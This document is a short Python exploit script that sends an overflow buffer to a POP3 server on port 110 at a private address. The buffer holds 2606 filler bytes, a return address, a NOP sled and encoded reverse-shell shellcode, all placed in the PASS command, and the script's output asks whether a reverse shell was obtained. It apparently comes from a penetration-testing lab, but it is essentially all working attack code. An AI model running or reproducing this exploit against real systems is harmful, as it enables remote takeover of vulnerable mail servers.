#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
shellcode = ("\xda\xd2\xbd\xba\x96\x0e\x1c\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x52\x31\x6a\x17\x83\xc2\x04\x03\xd0\x85\xec\xe9\xd8\x42\x72"
"\x11\x20\x93\x13\x9b\xc5\xa2\x13\xff\x8e\x95\xa3\x8b\xc2\x19"
"\x4f\xd9\xf6\xaa\x3d\xf6\xf9\x1b\x8b\x20\x34\x9b\xa0\x11\x57"
"\x1f\xbb\x45\xb7\x1e\x74\x98\xb6\x67\x69\x51\xea\x30\xe5\xc4"
"\x1a\x34\xb3\xd4\x91\x06\x55\x5d\x46\xde\x54\x4c\xd9\x54\x0f"
"\x4e\xd8\xb9\x3b\xc7\xc2\xde\x06\x91\x79\x14\xfc\x20\xab\x64"
"\xfd\x8f\x92\x48\x0c\xd1\xd3\x6f\xef\xa4\x2d\x8c\x92\xbe\xea"
"\xee\x48\x4a\xe8\x49\x1a\xec\xd4\x68\xcf\x6b\x9f\x67\xa4\xf8"
"\xc7\x6b\x3b\x2c\x7c\x97\xb0\xd3\x52\x11\x82\xf7\x76\x79\x50"
"\x99\x2f\x27\x37\xa6\x2f\x88\xe8\x02\x24\x25\xfc\x3e\x67\x22"
"\x31\x73\x97\xb2\x5d\x04\xe4\x80\xc2\xbe\x62\xa9\x8b\x18\x75"
"\xce\xa1\xdd\xe9\x31\x4a\x1e\x20\xf6\x1e\x4e\x5a\xdf\x1e\x05"
"\x9a\xe0\xca\x8a\xca\x4e\xa5\x6a\xba\x2e\x15\x03\xd0\xa0\x4a"
"\x33\xdb\x6a\xe3\xde\x26\xfd\x06\x14\x28\x43\x7e\x28\x28\xba"
"\xc4\xa5\xce\xd6\x2a\xe0\x59\x4f\xd2\xa9\x11\xee\x1b\x64\x5c"
"\x30\x97\x8b\xa1\xff\x50\xe1\xb1\x68\x91\xbc\xeb\x3f\xae\x6a"
"\x83\xdc\x3d\xf1\x53\xaa\x5d\xae\x04\xfb\x90\xa7\xc0\x11\x8a"
"\x11\xf6\xeb\x4a\x59\xb2\x37\xaf\x64\x3b\xb5\x8b\x42\x2b\x03"
"\x13\xcf\x1f\xdb\x42\x99\xc9\x9d\x3c\x6b\xa3\x77\x92\x25\x23"
"\x01\xd8\xf5\x35\x0e\x35\x80\xd9\xbf\xe0\xd5\xe6\x70\x65\xd2"
"\x9f\x6c\x15\x1d\x4a\x35\x25\x54\xd6\x1c\xae\x31\x83\x1c\xb3"
"\xc1\x7e\x62\xca\x41\x8a\x1b\x29\x59\xff\x1e\x75\xdd\xec\x52"
"\xe6\x88\x12\xc0\x07\x99")

buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode
try:
	print "\nSending evil buffer..."
	s.connect(('10.11.9.175',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	s.close()
	print "\ Done. Did you get a reverse shell?"
except:
	print "Could not connect to POP3!"
